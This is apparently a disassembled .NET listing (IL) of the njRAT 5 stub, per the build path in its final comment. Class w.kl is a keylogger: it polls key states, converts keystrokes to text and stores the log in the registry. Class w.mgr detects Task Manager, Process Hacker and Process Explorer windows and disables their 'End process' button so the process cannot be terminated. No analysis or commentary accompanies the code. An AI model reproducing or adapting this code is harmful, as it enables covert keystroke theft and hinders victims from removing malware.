  .method private static pinvokeimpl("user32.dll" winapi) 
          bool  GetKeyboardState(uint8[] a) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("user32.dll" nomangle ansi lasterr winapi) 
          int32  GetWindowThreadProcessId(native int a,
                                          int32& b) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("user32.dll" winapi) 
          uint32  MapVirtualKey(uint32 a,
                                uint32 b) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("user32.dll" winapi) 
          int32  ToUnicodeEx(uint32 a,
                             uint32 b,
                             uint8[] c,
                             [out] class [mscorlib]System.Text.StringBuilder  marshal( lpwstr) d,
                             int32 e,
                             uint32 f,
                             native int g) cil managed preservesig
  {
  }
  .method private static string  VKCodeToUnicode(uint32 a) cil managed
  {
    // Code size       155 (0x9b)
    .maxstack  7
    .locals init ([0] string VKCodeToUnicode,
             [1] uint32 b,
             [2] uint8[] buffer,
             [3] class [mscorlib]System.Text.StringBuilder d,
             [4] native int keyboardLayout,
             [5] int32 num3,
             [6] class [mscorlib]System.Exception exception,
             [7] class [mscorlib]System.Exception exception1,
             [8] bool VB$CG$t_bool$S0)
    IL_0000:  nop
    IL_0001:  nop
    .try
    {
      IL_0002:  newobj     instance void [mscorlib]System.Text.StringBuilder::.ctor()
      IL_0007:  stloc.3
      IL_0008:  ldc.i4     0xff
      IL_000d:  newarr     [mscorlib]System.Byte
      IL_0012:  stloc.2
      IL_0013:  ldloc.2
      IL_0014:  call       bool w.kl::GetKeyboardState(uint8[])
      IL_0019:  ldc.i4.0
      IL_001a:  ceq
      IL_001c:  stloc.s    VB$CG$t_bool$S0
      IL_001e:  ldloc.s    VB$CG$t_bool$S0
      IL_0020:  brfalse.s  IL_002a

      IL_0022:  ldstr      ""
      IL_0027:  stloc.0
      IL_0028:  leave.s    IL_0099

      IL_002a:  nop
      IL_002b:  ldarg.0
      IL_002c:  ldc.i4.0
      IL_002d:  call       uint32 w.kl::MapVirtualKey(uint32,
                                                      uint32)
      IL_0032:  stloc.1
      IL_0033:  ldc.i4.0
      IL_0034:  stloc.s    num3
      IL_0036:  call       native int w.OK::GetForegroundWindow()
      IL_003b:  ldloca.s   num3
      IL_003d:  call       int32 w.kl::GetWindowThreadProcessId(native int,
                                                                int32&)
      IL_0042:  call       int32 w.kl::GetKeyboardLayout(int32)
      IL_0047:  call       native int [mscorlib]System.IntPtr::op_Explicit(int32)
      IL_004c:  stloc.s    keyboardLayout
      IL_004e:  ldarg.0
      IL_004f:  ldloc.1
      IL_0050:  ldloc.2
      IL_0051:  ldloc.3
      IL_0052:  ldc.i4.5
      IL_0053:  ldc.i4.0
      IL_0054:  ldloc.s    keyboardLayout
      IL_0056:  call       int32 w.kl::ToUnicodeEx(uint32,
                                                   uint32,
                                                   uint8[],
                                                   class [mscorlib]System.Text.StringBuilder,
                                                   int32,
                                                   uint32,
                                                   native int)
      IL_005b:  pop
      IL_005c:  ldloc.3
      IL_005d:  callvirt   instance string [mscorlib]System.Text.StringBuilder::ToString()
      IL_0062:  stloc.0
      IL_0063:  leave.s    IL_0099

      IL_0065:  leave.s    IL_0089

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0067:  dup
      IL_0068:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_006d:  stloc.s    exception1
      IL_006f:  nop
      IL_0070:  ldloc.s    exception1
      IL_0072:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0077:  nop
      IL_0078:  ldloc.s    exception1
      IL_007a:  stloc.s    exception
      IL_007c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0081:  nop
      IL_0082:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0087:  leave.s    IL_0089

    }  // end handler
    IL_0089:  nop
    IL_008a:  ldarg.0
    IL_008b:  conv.ovf.i4.un
    IL_008c:  box        [System.Windows.Forms]System.Windows.Forms.Keys
    IL_0091:  callvirt   instance string [mscorlib]System.Enum::ToString()
    IL_0096:  stloc.0
    IL_0097:  br.s       IL_0099

    IL_0099:  ldloc.0
    IL_009a:  ret
  } // end of method kl::VKCodeToUnicode

  .method public instance void  WRK() cil managed
  {
    // Code size       319 (0x13f)
    .maxstack  5
    .locals init ([0] int32 num1,
             [1] int32 num2,
             [2] valuetype [System.Windows.Forms]System.Windows.Forms.Keys keys1,
             [3] string str1,
             [4] int32 num3,
             [5] class [mscorlib]System.Exception exception1,
             [6] bool VB$CG$t_bool$S0)
    IL_0000:  nop
    IL_0001:  ldarg.0
    IL_0002:  ldarg.0
    IL_0003:  ldfld      string w.kl::vn
    IL_0008:  ldstr      ""
    IL_000d:  call       object w.OK::GTV(string,
                                          object)
    IL_0012:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
    IL_0017:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
    IL_001c:  stfld      string w.kl::Logs
    IL_0021:  nop
    .try
    {
      IL_0022:  nop
      IL_0023:  nop
      IL_0024:  ldc.i4.1
      IL_0025:  stloc.0
      IL_0026:  ldc.i4.0
      IL_0027:  stloc.1
      IL_0028:  nop
      IL_0029:  ldloc.1
      IL_002a:  call       int16 w.kl::GetAsyncKeyState(int32)
      IL_002f:  ldc.i4     0xffff8001
      IL_0034:  ceq
      IL_0036:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer w.OK::F
      IL_003b:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Keyboard [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer::get_Keyboard()
      IL_0040:  callvirt   instance bool [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Keyboard::get_CtrlKeyDown()
      IL_0045:  ldc.i4.0
      IL_0046:  ceq
      IL_0048:  and
      IL_0049:  stloc.s    VB$CG$t_bool$S0
      IL_004b:  ldloc.s    VB$CG$t_bool$S0
      IL_004d:  brfalse.s  IL_0099

      IL_004f:  ldloc.1
      IL_0050:  stloc.2
      IL_0051:  ldarg.0
      IL_0052:  ldloc.2
      IL_0053:  callvirt   instance string w.kl::Fix(valuetype [System.Windows.Forms]System.Windows.Forms.Keys)
      IL_0058:  stloc.3
      IL_0059:  ldloc.3
      IL_005a:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_005f:  ldc.i4.0
      IL_0060:  cgt
      IL_0062:  stloc.s    VB$CG$t_bool$S0
      IL_0064:  ldloc.s    VB$CG$t_bool$S0
      IL_0066:  brfalse.s  IL_0091

      IL_0068:  ldarg.0
      IL_0069:  ldarg.0
      IL_006a:  ldfld      string w.kl::Logs
      IL_006f:  ldarg.0
      IL_0070:  callvirt   instance string w.kl::AV()
      IL_0075:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_007a:  stfld      string w.kl::Logs
      IL_007f:  ldarg.0
      IL_0080:  ldarg.0
      IL_0081:  ldfld      string w.kl::Logs
      IL_0086:  ldloc.3
      IL_0087:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_008c:  stfld      string w.kl::Logs
      IL_0091:  nop
      IL_0092:  ldarg.0
      IL_0093:  ldloc.2
      IL_0094:  stfld      valuetype [System.Windows.Forms]System.Windows.Forms.Keys w.kl::lastKey
      IL_0099:  nop
      IL_009a:  ldloc.1
      IL_009b:  ldc.i4.1
      IL_009c:  add.ovf
      IL_009d:  stloc.1
      IL_009e:  ldloc.1
      IL_009f:  ldc.i4     0xff
      IL_00a4:  cgt
      IL_00a6:  ldc.i4.0
      IL_00a7:  ceq
      IL_00a9:  stloc.s    VB$CG$t_bool$S0
      IL_00ab:  ldloc.s    VB$CG$t_bool$S0
      IL_00ad:  brtrue     IL_0029

      IL_00b2:  ldloc.0
      IL_00b3:  ldc.i4     0x3e8
      IL_00b8:  ceq
      IL_00ba:  stloc.s    VB$CG$t_bool$S0
      IL_00bc:  ldloc.s    VB$CG$t_bool$S0
      IL_00be:  brfalse.s  IL_011d

      IL_00c0:  ldc.i4.0
      IL_00c1:  stloc.0
      IL_00c2:  ldstr      "20"
      IL_00c7:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(string)
      IL_00cc:  ldc.i4     0x400
      IL_00d1:  mul.ovf
      IL_00d2:  stloc.s    num3
      IL_00d4:  ldarg.0
      IL_00d5:  ldfld      string w.kl::Logs
      IL_00da:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_00df:  ldloc.s    num3
      IL_00e1:  cgt
      IL_00e3:  stloc.s    VB$CG$t_bool$S0
      IL_00e5:  ldloc.s    VB$CG$t_bool$S0
      IL_00e7:  brfalse.s  IL_0109

      IL_00e9:  ldarg.0
      IL_00ea:  ldarg.0
      IL_00eb:  ldfld      string w.kl::Logs
      IL_00f0:  ldc.i4.0
      IL_00f1:  ldarg.0
      IL_00f2:  ldfld      string w.kl::Logs
      IL_00f7:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_00fc:  ldloc.s    num3
      IL_00fe:  sub.ovf
      IL_00ff:  callvirt   instance string [mscorlib]System.String::Remove(int32,
                                                                           int32)
      IL_0104:  stfld      string w.kl::Logs
      IL_0109:  nop
      IL_010a:  ldarg.0
      IL_010b:  ldfld      string w.kl::vn
      IL_0110:  ldarg.0
      IL_0111:  ldfld      string w.kl::Logs
      IL_0116:  ldc.i4.1
      IL_0117:  call       bool w.OK::STV(string,
                                          object,
                                          valuetype [mscorlib]Microsoft.Win32.RegistryValueKind)
      IL_011c:  pop
      IL_011d:  nop
      IL_011e:  ldc.i4.1
      IL_011f:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
      IL_0124:  nop
      IL_0125:  br         IL_0023

      IL_012a:  leave.s    IL_013c

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_012c:  dup
      IL_012d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0132:  stloc.s    exception1
      IL_0134:  nop
      IL_0135:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_013a:  leave.s    IL_013c

    }  // end handler
    IL_013c:  nop
    IL_013d:  nop
    IL_013e:  ret
  } // end of method kl::WRK

} // end of class w.kl

.class public auto ansi w.mgr
       extends [mscorlib]System.Object
{
  .class auto ansi sealed nested private EnumWindProc
         extends [mscorlib]System.MulticastDelegate
  {
    .method public specialname rtspecialname 
            instance void  .ctor(object TargetObject,
                                 native int TargetMethod) runtime managed
    {
    } // end of method EnumWindProc::.ctor

    .method public newslot strict virtual 
            instance class [mscorlib]System.IAsyncResult 
            BeginInvoke(int32 hWnd,
                        int32 lParam,
                        class [mscorlib]System.AsyncCallback DelegateCallback,
                        object DelegateAsyncState) runtime managed
    {
    } // end of method EnumWindProc::BeginInvoke

    .method public newslot strict virtual 
            instance bool  EndInvoke(class [mscorlib]System.IAsyncResult DelegateAsyncResult) runtime managed
    {
    } // end of method EnumWindProc::EndInvoke

    .method public newslot strict virtual 
            instance bool  Invoke(int32 hWnd,
                                  int32 lParam) runtime managed
    {
    } // end of method EnumWindProc::Invoke

  } // end of class EnumWindProc

  .class auto ansi sealed nested private EnumChildWindProc
         extends [mscorlib]System.MulticastDelegate
  {
    .method public specialname rtspecialname 
            instance void  .ctor(object TargetObject,
                                 native int TargetMethod) runtime managed
    {
    } // end of method EnumChildWindProc::.ctor

    .method public newslot strict virtual 
            instance class [mscorlib]System.IAsyncResult 
            BeginInvoke(int32 hWnd,
                        int32 lParam,
                        class [mscorlib]System.AsyncCallback DelegateCallback,
                        object DelegateAsyncState) runtime managed
    {
    } // end of method EnumChildWindProc::BeginInvoke

    .method public newslot strict virtual 
            instance bool  EndInvoke(class [mscorlib]System.IAsyncResult DelegateAsyncResult) runtime managed
    {
    } // end of method EnumChildWindProc::EndInvoke

    .method public newslot strict virtual 
            instance bool  Invoke(int32 hWnd,
                                  int32 lParam) runtime managed
    {
    } // end of method EnumChildWindProc::Invoke

  } // end of class EnumChildWindProc

  .field private class [mscorlib]System.Collections.Generic.List`1<native int> CLD
  .method public specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    // Code size       20 (0x14)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
    IL_0006:  nop
    IL_0007:  ldarg.0
    IL_0008:  newobj     instance void class [mscorlib]System.Collections.Generic.List`1<native int>::.ctor()
    IL_000d:  stfld      class [mscorlib]System.Collections.Generic.List`1<native int> w.mgr::CLD
    IL_0012:  nop
    IL_0013:  ret
  } // end of method mgr::.ctor

  .method private static pinvokeimpl("user32.dll" winapi) 
          bool  EnableWindow(native int hWnd,
                             bool bEnable) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("user32.dll" nomangle ansi lasterr winapi) 
          int32  GetWindowThreadProcessId(native int hwnd,
                                          int32& lpdwProcessID) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("user32.dll" nomangle ansi lasterr winapi) 
          native int  GetForegroundWindow() cil managed preservesig
  {
  }
  .method private static pinvokeimpl("user32" as "GetClassNameA" nomangle ansi lasterr winapi) 
          int32  GetClassName(int32 hwnd,
                              string&  marshal( byvalstr) lpClassName,
                              int32 nMaxCount) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("user32" as "SendMessageA" nomangle ansi lasterr winapi) 
          int32  SendMessage(int32 hwnd,
                             int32 wMsg,
                             int32 wParam,
                             string&  marshal( byvalstr) lParam) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("user32.dll" autochar lasterr winapi) 
          int32  GetWindowText(int32 hwnd,
                               class [mscorlib]System.Text.StringBuilder lpString,
                               int32 cch) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("user32.dll" autochar lasterr winapi) 
          int32  GetWindowTextLength(int32 hwnd) cil managed preservesig
  {
  }
  .method private static pinvokeimpl("user32" nomangle ansi lasterr winapi) 
          int32  EnumChildWindows(native int hWnd,
                                  class w.mgr/EnumWindProc lpEnumFunc,
                                  native int& lParam) cil managed preservesig
  {
  }
  .method private instance bool  EnumChild(int32 hWnd,
                                           int32 lParam) cil managed
  {
    // Code size       25 (0x19)
    .maxstack  2
    .locals init ([0] bool EnumChild)
    IL_0000:  nop
    IL_0001:  ldarg.0
    IL_0002:  ldfld      class [mscorlib]System.Collections.Generic.List`1<native int> w.mgr::CLD
    IL_0007:  ldarg.1
    IL_0008:  call       native int [mscorlib]System.IntPtr::op_Explicit(int32)
    IL_000d:  callvirt   instance void class [mscorlib]System.Collections.Generic.List`1<native int>::Add(!0)
    IL_0012:  nop
    IL_0013:  ldc.i4.1
    IL_0014:  stloc.0
    IL_0015:  br.s       IL_0017

    IL_0017:  ldloc.0
    IL_0018:  ret
  } // end of method mgr::EnumChild

  .method public instance void  protect() cil managed
  {
    // Code size       589 (0x24d)
    .maxstack  4
    .locals init ([0] native int hwd,
             [1] int32 id,
             [2] class [System]System.Diagnostics.Process p,
             [3] int32 text_len,
             [4] string Title,
             [5] int32 'ret',
             [6] class [mscorlib]System.Text.StringBuilder sb,
             [7] class [mscorlib]System.Collections.Generic.List`1<native int> button,
             [8] int32 statics,
             [9] string className,
             [10] int32 ln,
             [11] native int x,
             [12] int32 VB$t_i4$L0,
             [13] native int[] VB$t_array$L0,
             [14] string VB$t_string$S0,
             [15] bool VB$CG$t_bool$S0)
    IL_0000:  nop
    IL_0001:  br         IL_0241

    IL_0006:  ldc.i4     0xc8
    IL_000b:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
    IL_0010:  nop
    IL_0011:  call       native int w.mgr::GetForegroundWindow()
    IL_0016:  stloc.0
    IL_0017:  ldloca.s   hwd
    IL_0019:  call       instance int32 [mscorlib]System.IntPtr::ToInt32()
    IL_001e:  ldc.i4.0
    IL_001f:  ceq
    IL_0021:  stloc.s    VB$CG$t_bool$S0
    IL_0023:  ldloc.s    VB$CG$t_bool$S0
    IL_0025:  brfalse.s  IL_002c

    IL_0027:  br         IL_0241

    IL_002c:  ldc.i4.0
    IL_002d:  stloc.1
    IL_002e:  ldloc.0
    IL_002f:  ldloca.s   id
    IL_0031:  call       int32 w.mgr::GetWindowThreadProcessId(native int,
                                                               int32&)
    IL_0036:  pop
    IL_0037:  ldloc.1
    IL_0038:  ldc.i4.0
    IL_0039:  cgt
    IL_003b:  stloc.s    VB$CG$t_bool$S0
    IL_003d:  ldloc.s    VB$CG$t_bool$S0
    IL_003f:  brfalse    IL_023f

    IL_0044:  ldstr      ""
    IL_0049:  stloc.s    Title
    IL_004b:  ldloc.0
    IL_004c:  call       int32 [mscorlib]System.IntPtr::op_Explicit(native int)
    IL_0051:  call       int32 w.mgr::GetWindowTextLength(int32)
    IL_0056:  stloc.3
    IL_0057:  ldloc.3
    IL_0058:  ldc.i4.0
    IL_0059:  ceq
    IL_005b:  stloc.s    VB$CG$t_bool$S0
    IL_005d:  ldloc.s    VB$CG$t_bool$S0
    IL_005f:  brfalse.s  IL_006a

    IL_0061:  ldstr      ""
    IL_0066:  stloc.s    Title
    IL_0068:  br.s       IL_00aa

    IL_006a:  nop
    IL_006b:  ldloc.3
    IL_006c:  ldc.i4.1
    IL_006d:  add.ovf
    IL_006e:  newobj     instance void [mscorlib]System.Text.StringBuilder::.ctor(int32)
    IL_0073:  stloc.s    sb
    IL_0075:  ldloc.0
    IL_0076:  call       int32 [mscorlib]System.IntPtr::op_Explicit(native int)
    IL_007b:  ldloc.s    sb
    IL_007d:  ldloc.s    sb
    IL_007f:  callvirt   instance int32 [mscorlib]System.Text.StringBuilder::get_Capacity()
    IL_0084:  call       int32 w.mgr::GetWindowText(int32,
                                                    class [mscorlib]System.Text.StringBuilder,
                                                    int32)
    IL_0089:  stloc.s    'ret'
    IL_008b:  ldloc.s    'ret'
    IL_008d:  ldc.i4.0
    IL_008e:  ceq
    IL_0090:  stloc.s    VB$CG$t_bool$S0
    IL_0092:  ldloc.s    VB$CG$t_bool$S0
    IL_0094:  brfalse.s  IL_009f

    IL_0096:  ldstr      ""
    IL_009b:  stloc.s    Title
    IL_009d:  br.s       IL_00a9

    IL_009f:  nop
    IL_00a0:  ldloc.s    sb
    IL_00a2:  callvirt   instance string [mscorlib]System.Text.StringBuilder::ToString()
    IL_00a7:  stloc.s    Title
    IL_00a9:  nop
    IL_00aa:  nop
    IL_00ab:  ldloc.1
    IL_00ac:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::GetProcessById(int32)
    IL_00b1:  stloc.2
    IL_00b2:  ldloc.2
    IL_00b3:  callvirt   instance string [System]System.Diagnostics.Process::get_ProcessName()
    IL_00b8:  callvirt   instance string [mscorlib]System.String::ToLower()
    IL_00bd:  ldstr      "taskmgr"
    IL_00c2:  ldc.i4.0
    IL_00c3:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                      string,
                                                                                                                      bool)
    IL_00c8:  ldc.i4.0
    IL_00c9:  ceq
    IL_00cb:  ldloc.2
    IL_00cc:  callvirt   instance string [System]System.Diagnostics.Process::get_ProcessName()
    IL_00d1:  callvirt   instance string [mscorlib]System.String::ToLower()
    IL_00d6:  ldstr      "processviewer"
    IL_00db:  ldc.i4.0
    IL_00dc:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                      string,
                                                                                                                      bool)
    IL_00e1:  ldc.i4.0
    IL_00e2:  ceq
    IL_00e4:  or
    IL_00e5:  ldloc.2
    IL_00e6:  callvirt   instance string [System]System.Diagnostics.Process::get_ProcessName()
    IL_00eb:  callvirt   instance string [mscorlib]System.String::ToLower()
    IL_00f0:  ldstr      "processhacker"
    IL_00f5:  ldc.i4.0
    IL_00f6:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                      string,
                                                                                                                      bool)
    IL_00fb:  ldc.i4.0
    IL_00fc:  ceq
    IL_00fe:  or
    IL_00ff:  ldloc.s    Title
    IL_0101:  callvirt   instance string [mscorlib]System.String::ToLower()
    IL_0106:  ldstr      "process explorer"
    IL_010b:  ldc.i4.0
    IL_010c:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                      string,
                                                                                                                      bool)
    IL_0111:  ldc.i4.0
    IL_0112:  ceq
    IL_0114:  or
    IL_0115:  stloc.s    VB$CG$t_bool$S0
    IL_0117:  ldloc.s    VB$CG$t_bool$S0
    IL_0119:  brfalse    IL_023e

    IL_011e:  newobj     instance void class [mscorlib]System.Collections.Generic.List`1<native int>::.ctor()
    IL_0123:  stloc.s    button
    IL_0125:  ldc.i4.0
    IL_0126:  stloc.s    statics
    IL_0128:  ldarg.0
    IL_0129:  ldloc.0
    IL_012a:  callvirt   instance native int[] w.mgr::GetChild(native int)
    IL_012f:  stloc.s    VB$t_array$L0
    IL_0131:  ldc.i4.0
    IL_0132:  stloc.s    VB$t_i4$L0
    IL_0134:  br         IL_01e2

    IL_0139:  ldloc.s    VB$t_array$L0
    IL_013b:  ldloc.s    VB$t_i4$L0
    IL_013d:  ldelema    [mscorlib]System.IntPtr
    IL_0142:  ldobj      [mscorlib]System.IntPtr
    IL_0147:  stloc.s    x
    IL_0149:  ldc.i4     0xc8
    IL_014e:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::Space(int32)
    IL_0153:  stloc.s    className
    IL_0155:  ldloc.s    x
    IL_0157:  call       int32 [mscorlib]System.IntPtr::op_Explicit(native int)
    IL_015c:  ldloca.s   className
    IL_015e:  ldc.i4     0xc8
    IL_0163:  call       int32 w.mgr::GetClassName(int32,
                                                   string&,
                                                   int32)
    IL_0168:  stloc.s    ln
    IL_016a:  ldloc.s    className
    IL_016c:  ldloc.s    ln
    IL_016e:  ldc.i4     0xc8
    IL_0173:  ldloc.s    ln
    IL_0175:  sub.ovf
    IL_0176:  callvirt   instance string [mscorlib]System.String::Remove(int32,
                                                                         int32)
    IL_017b:  stloc.s    className
    IL_017d:  ldloc.s    className
    IL_017f:  callvirt   instance string [mscorlib]System.String::ToLower()
    IL_0184:  ldstr      "button"
    IL_0189:  ldc.i4.0
    IL_018a:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                      string,
                                                                                                                      bool)
    IL_018f:  ldc.i4.0
    IL_0190:  ceq
    IL_0192:  stloc.s    VB$CG$t_bool$S0
    IL_0194:  ldloc.s    VB$CG$t_bool$S0
    IL_0196:  brfalse.s  IL_01a2

    IL_0198:  ldloc.s    button
    IL_019a:  ldloc.s    x
    IL_019c:  callvirt   instance void class [mscorlib]System.Collections.Generic.List`1<native int>::Add(!0)
    IL_01a1:  nop
    IL_01a2:  nop
    IL_01a3:  ldloc.s    className
    IL_01a5:  callvirt   instance string [mscorlib]System.String::ToLower()
    IL_01aa:  ldstr      "static"
    IL_01af:  ldc.i4.0
    IL_01b0:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                      string,
                                                                                                                      bool)
    IL_01b5:  ldc.i4.0
    IL_01b6:  ceq
    IL_01b8:  ldloc.s    className
    IL_01ba:  callvirt   instance string [mscorlib]System.String::ToLower()
    IL_01bf:  ldstr      "directuihwnd"
    IL_01c4:  ldc.i4.0
    IL_01c5:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                      string,
                                                                                                                      bool)
    IL_01ca:  ldc.i4.0
    IL_01cb:  ceq
    IL_01cd:  or
    IL_01ce:  stloc.s    VB$CG$t_bool$S0
    IL_01d0:  ldloc.s    VB$CG$t_bool$S0
    IL_01d2:  brfalse.s  IL_01da

    IL_01d4:  ldloc.s    statics
    IL_01d6:  ldc.i4.1
    IL_01d7:  add.ovf
    IL_01d8:  stloc.s    statics
    IL_01da:  nop
    IL_01db:  ldloc.s    VB$t_i4$L0
    IL_01dd:  ldc.i4.1
    IL_01de:  add.ovf
    IL_01df:  stloc.s    VB$t_i4$L0
    IL_01e1:  nop
    IL_01e2:  ldloc.s    VB$t_i4$L0
    IL_01e4:  ldloc.s    VB$t_array$L0
    IL_01e6:  ldlen
    IL_01e7:  conv.ovf.i4
    IL_01e8:  clt
    IL_01ea:  stloc.s    VB$CG$t_bool$S0
    IL_01ec:  ldloc.s    VB$CG$t_bool$S0
    IL_01ee:  brtrue     IL_0139

    IL_01f3:  ldloc.s    button
    IL_01f5:  callvirt   instance int32 class [mscorlib]System.Collections.Generic.List`1<native int>::get_Count()
    IL_01fa:  ldc.i4.2
    IL_01fb:  ceq
    IL_01fd:  ldloc.s    statics
    IL_01ff:  ldc.i4.2
    IL_0200:  ceq
    IL_0202:  ldloc.s    statics
    IL_0204:  ldc.i4.1
    IL_0205:  ceq
    IL_0207:  or
    IL_0208:  and
    IL_0209:  stloc.s    VB$CG$t_bool$S0
    IL_020b:  ldloc.s    VB$CG$t_bool$S0
    IL_020d:  brfalse.s  IL_023d

    IL_020f:  ldloc.s    button
    IL_0211:  ldc.i4.0
    IL_0212:  callvirt   instance !0 class [mscorlib]System.Collections.Generic.List`1<native int>::get_Item(int32)
    IL_0217:  ldc.i4.0
    IL_0218:  call       bool w.mgr::EnableWindow(native int,
                                                  bool)
    IL_021d:  pop
    IL_021e:  ldloc.s    button
    IL_0220:  ldc.i4.0
    IL_0221:  callvirt   instance !0 class [mscorlib]System.Collections.Generic.List`1<native int>::get_Item(int32)
    IL_0226:  call       int32 [mscorlib]System.IntPtr::op_Explicit(native int)
    IL_022b:  ldc.i4.s   12
    IL_022d:  ldc.i4.0
    IL_022e:  ldstr      "End process"
    IL_0233:  stloc.s    VB$t_string$S0
    IL_0235:  ldloca.s   VB$t_string$S0
    IL_0237:  call       int32 w.mgr::SendMessage(int32,
                                                  int32,
                                                  int32,
                                                  string&)
    IL_023c:  pop
    IL_023d:  nop
    IL_023e:  nop
    IL_023f:  nop
    IL_0240:  nop
    IL_0241:  ldc.i4.1
    IL_0242:  stloc.s    VB$CG$t_bool$S0
    IL_0244:  ldloc.s    VB$CG$t_bool$S0
    IL_0246:  brtrue     IL_0006

    IL_024b:  nop
    IL_024c:  ret
  } // end of method mgr::protect

  .method private instance native int[]  GetChild(native int hwd) cil managed
  {
    // Code size       80 (0x50)
    .maxstack  3
    .locals init ([0] native int[] GetChild,
             [1] class w.mgr VB$t_ref$L0,
             [2] native int VB$t_struct$S0)
    IL_0000:  nop
    IL_0001:  nop
    IL_0002:  ldarg.0
    IL_0003:  stloc.1
    IL_0004:  ldloc.1
    IL_0005:  call       void [mscorlib]System.Threading.Monitor::Enter(object)
    IL_000a:  nop
    IL_000b:  nop
    .try
    {
      IL_000c:  ldarg.0
      IL_000d:  ldfld      class [mscorlib]System.Collections.Generic.List`1<native int> w.mgr::CLD
      IL_0012:  callvirt   instance void class [mscorlib]System.Collections.Generic.List`1<native int>::Clear()
      IL_0017:  nop
      IL_0018:  ldarg.1
      IL_0019:  ldarg.0
      IL_001a:  dup
      IL_001b:  ldvirtftn  instance bool w.mgr::EnumChild(int32,
                                                          int32)
      IL_0021:  newobj     instance void w.mgr/EnumWindProc::.ctor(object,
                                                                   native int)
      IL_0026:  ldc.i4.0
      IL_0027:  call       native int [mscorlib]System.IntPtr::op_Explicit(int32)
      IL_002c:  stloc.2
      IL_002d:  ldloca.s   VB$t_struct$S0
      IL_002f:  call       int32 w.mgr::EnumChildWindows(native int,
                                                         class w.mgr/EnumWindProc,
                                                         native int&)
      IL_0034:  pop
      IL_0035:  ldarg.0
      IL_0036:  ldfld      class [mscorlib]System.Collections.Generic.List`1<native int> w.mgr::CLD
      IL_003b:  callvirt   instance !0[] class [mscorlib]System.Collections.Generic.List`1<native int>::ToArray()
      IL_0040:  stloc.0
      IL_0041:  leave.s    IL_004e

      IL_0043:  nop
      IL_0044:  leave.s    IL_004e

    }  // end .try
    finally
    {
      IL_0046:  ldloc.1
      IL_0047:  call       void [mscorlib]System.Threading.Monitor::Exit(object)
      IL_004c:  nop
      IL_004d:  endfinally
    }  // end handler
    IL_004e:  ldloc.0
    IL_004f:  ret
  } // end of method mgr::GetChild

} // end of class w.mgr


// =============================================================

// *********** DISASSEMBLY COMPLETE ***********************
// WARNING: Created Win32 resource file C:\Users\im523\Desktop\Sementara\NjRAT 5 fix7\bin\Debug\Stub.res
